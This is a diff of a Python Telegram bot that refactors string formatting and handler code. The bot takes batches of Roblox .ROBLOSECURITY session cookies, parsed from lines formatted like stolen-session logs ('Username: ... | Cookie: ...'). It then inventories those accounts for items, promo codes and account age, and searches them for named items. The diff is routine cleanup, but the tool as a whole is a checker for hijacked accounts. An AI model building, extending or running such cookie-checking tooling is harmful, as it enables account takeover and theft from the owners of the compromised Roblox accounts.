         await message.answer(f"❌ Ни на одном аккаунте не найдено предметов «{search_term}».")
 
-
-# ================================================================
-#  КЛАВИАТУРА
-# ================================================================
-
+# ========== КЛАВИАТУРА ==========
 def settings_kb():
     rows = []
     for key, label in ASSET_LABELS.items():
         icon = "✅" if settings["asset_types"][key] else "❌"
-        rows.append([InlineKeyboardButton(
-            text="{} {}".format(icon, label),
-            callback_data="tog_{}".format(key)
-        )])
+        rows.append([InlineKeyboardButton(text=f"{icon} {label}", callback_data=f"tog_{key}")])
     pi = "✅" if settings["check_promo"] else "❌"
-    rows.append([InlineKeyboardButton(text="{} 🎁 Промо".format(pi), callback_data="tog_promo")])
+    rows.append([InlineKeyboardButton(text=f"{pi} 🎁 Промо", callback_data="tog_promo")])
     rows.append([
-        InlineKeyboardButton(text="📅 С {}".format(settings["year_from"]), callback_data="set_yf"),
-        InlineKeyboardButton(text="📅 По {}".format(settings["year_to"]),  callback_data="set_yt"),
+        InlineKeyboardButton(text=f"📅 С {settings['year_from']}", callback_data="set_yf"),
+        InlineKeyboardButton(text=f"📅 По {settings['year_to']}", callback_data="set_yt"),
     ])
     return InlineKeyboardMarkup(inline_keyboard=rows)
-
 
 def is_admin(obj):
     return obj.from_user.id in ADMIN_IDS
 
-
-# ================================================================
-#  ХЕНДЛЕРЫ
-# ================================================================
-
+# ========== ХЕНДЛЕРЫ ==========
 @dp.message(CommandStart())
 async def cmd_start(message: Message):
     if not is_admin(message): return
@@ -924,43 +656,32 @@ async def cmd_start(message: Message):
         "🔍 /search — поиск предмета по названию"
     )
 
-
 @dp.message(Command("info"))
 async def cmd_info(message: Message):
     if not is_admin(message): return
     types_on = [ASSET_LABELS[k] for k, v in settings["asset_types"].items() if v]
     await message.answer(
-        "ℹ️ <b>Настройки</b>\n📅 {}-{}\n🎁 Промо: {}\n📦 {}".format(
-            settings["year_from"], settings["year_to"],
-            "✅" if settings["check_promo"] else "❌",
-            ", ".join(types_on)
-        )
+        f"ℹ️ <b>Настройки</b>\n📅 {settings['year_from']}-{settings['year_to']}\n"
+        f"🎁 Промо: {'✅' if settings['check_promo'] else '❌'}\n📦 {', '.join(types_on)}"
     )
-
 
 @dp.message(Command("settings"))
 async def cmd_settings(message: Message):
     if not is_admin(message): return
     await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())
 
-
 @dp.message(Command("debug"))
 async def cmd_debug(message: Message):
     if not is_admin(message): return
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2 or len(parts[1].strip()) < 50:
-        await message.answer(
-            "Использование: отправь cookie следующим сообщением\n"
-            "или: /debug [cookie]"
-        )
+        await message.answer("Использование: отправь cookie следующим сообщением\nили: /debug [cookie]")
         return
     await run_check(message, parts[1].strip(), show_debug=True)
 
-
 @dp.message(Command("search"))
 async def cmd_search(message: Message, state: FSMContext):
-    if not is_admin(message):
-        return
+    if not is_admin(message): return
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
         await message.answer("🔍 Введите название предмета для поиска:")
@@ -970,7 +691,6 @@ async def cmd_search(message: Message, state: FSMContext):
     await state.update_data(search_term=term)
     await message.answer("📤 Отправьте .ROBLOSECURITY куки (текстом или .txt файл) для поиска:")
     await state.set_state(SearchState.waiting_for_cookie)
-
 
 @dp.message(SearchState.waiting_for_term)
 async def process_search_term(message: Message, state: FSMContext):
@@ -984,7 +704,6 @@ async def process_search_term(message: Message, state: FSMContext):
     await state.update_data(search_term=term)
     await message.answer("📤 Отправьте .ROBLOSECURITY куки (текстом или .txt файл) для поиска:")
     await state.set_state(SearchState.waiting_for_cookie)
-
 
 @dp.message(SearchState.waiting_for_cookie, F.text)
 async def handle_search_cookie_text(message: Message, state: FSMContext):
@@ -1000,11 +719,8 @@ async def handle_search_cookie_text(message: Message, state: FSMContext):
         await state.clear()
         return
     await state.clear()
-    if len(cookies) == 1:
-        await run_check(message, cookies[0], search_term=term)
-    else:
-        await run_batch_search(message, cookies, term)
-
+    # ВСЕГДА вызываем батчевую функцию, даже для одной куки
+    await run_batch_search(message, cookies, term)
 
 @dp.message(SearchState.waiting_for_cookie, F.document)
 async def handle_search_cookie_file(message: Message, state: FSMContext):
@@ -1027,7 +743,6 @@ async def handle_search_cookie_file(message: Message, state: FSMContext):
         l = l.strip()
         if not l:
             continue
-        # Формат: "Username: ... | Cookie: _|WARNING...|_..."
         if "Cookie: " in l:
             val = l.split("Cookie: ")[-1].strip()
             if len(val) > 50:
@@ -1040,11 +755,8 @@ async def handle_search_cookie_file(message: Message, state: FSMContext):
         await state.clear()
         return
     await state.clear()
-    if len(cookies) == 1:
-        await run_check(message, cookies[0], search_term=term)
-    else:
-        await run_batch_search(message, cookies, term)
-
+    # ВСЕГДА вызываем батчевую функцию
+    await run_batch_search(message, cookies, term)
 
 @dp.callback_query(F.data.startswith("tog_"))
 async def cb_toggle(cb: CallbackQuery):
@@ -1057,22 +769,19 @@ async def cb_toggle(cb: CallbackQuery):
     await cb.message.edit_reply_markup(reply_markup=settings_kb())
     await cb.answer("✅")
 
-
 @dp.callback_query(F.data == "set_yf")
 async def cb_yf(cb: CallbackQuery, state: FSMContext):
     if not is_admin(cb): return await cb.answer("⛔")
-    await cb.message.answer("📅 Начальный год (сейчас {}):".format(settings["year_from"]))
+    await cb.message.answer(f"📅 Начальный год (сейчас {settings['year_from']}):")
     await state.set_state(SetYear.from_year)
     await cb.answer()
-
 
 @dp.callback_query(F.data == "set_yt")
 async def cb_yt(cb: CallbackQuery, state: FSMContext):
     if not is_admin(cb): return await cb.answer("⛔")
-    await cb.message.answer("📅 Конечный год (сейчас {}):".format(settings["year_to"]))
+    await cb.message.answer(f"📅 Конечный год (сейчас {settings['year_to']}):")
     await state.set_state(SetYear.to_year)
     await cb.answer()
-
 
 @dp.message(SetYear.from_year)
 async def save_yf(message: Message, state: FSMContext):
@@ -1083,11 +792,10 @@ async def save_yf(message: Message, state: FSMContext):
         y = int(message.text.strip())
         assert 2006 <= y <= 2030
         settings["year_from"] = y
-        await message.answer("✅ Начальный год: <b>{}</b>".format(y))
+        await message.answer(f"✅ Начальный год: <b>{y}</b>")
         await state.clear()
     except (ValueError, AssertionError):
         await message.answer("❌ Введи число 2006–2030")
-
 
 @dp.message(SetYear.to_year)
 async def save_yt(message: Message, state: FSMContext):
@@ -1098,18 +806,15 @@ async def save_yt(message: Message, state: FSMContext):
         y = int(message.text.strip())
         assert 2006 <= y <= 2030
         settings["year_to"] = y
-        await message.answer("✅ Конечный год: <b>{}</b>".format(y))
+        await message.answer(f"✅ Конечный год: <b>{y}</b>")
         await state.clear()
     except (ValueError, AssertionError):
         await message.answer("❌ Введи число 2006–2030")
 
-
 @dp.message(F.document)
 async def handle_file(message: Message, state: FSMContext):
     if not is_admin(message): return
-    if await state.get_state():
-        # Если есть активное состояние, не обрабатываем здесь
-        return
+    if await state.get_state(): return
     doc = message.document
     if not doc.file_name.endswith(".txt"):
         await message.answer("❌ Нужен .txt файл")
@@ -1122,15 +827,12 @@ async def handle_file(message: Message, state: FSMContext):
     cookies = []
     for l in lines:
         l = l.strip()
-        if not l:
-            continue
-        # Формат: "Username: ... | Cookie: _|WARNING...|_..."
+        if not l: continue
         if "Cookie: " in l:
             val = l.split("Cookie: ")[-1].strip()
             if len(val) > 50:
                 cookies.append(val)
         elif len(l) > 50:
-            # Просто голый кук
             cookies.append(l)
     cookies = [clean_cookie(c) for c in cookies if c.strip() and len(clean_cookie(c)) >= 50]
     if not cookies:
@@ -1141,18 +843,15 @@ async def handle_file(message: Message, state: FSMContext):
     else:
         await run_batch(message, cookies)
 
-
 @dp.message(F.text)
 async def handle_text(message: Message, state: FSMContext):
     if not is_admin(message): return
-    if await state.get_state():
-        return
+    if await state.get_state(): return
     raw_lines = message.text.splitlines()
     lines = []
     for l in raw_lines:
         l = l.strip()
-        if not l:
-            continue
+        if not l: continue
         if "Cookie: " in l:
             val = l.split("Cookie: ")[-1].strip()
             if len(val) > 50:
@@ -1167,7 +866,6 @@ async def handle_text(message: Message, state: FSMContext):
         await run_check(message, cookies[0])
     else:
         await run_batch(message, cookies)
-
 
 # ================================================================
 async def main():
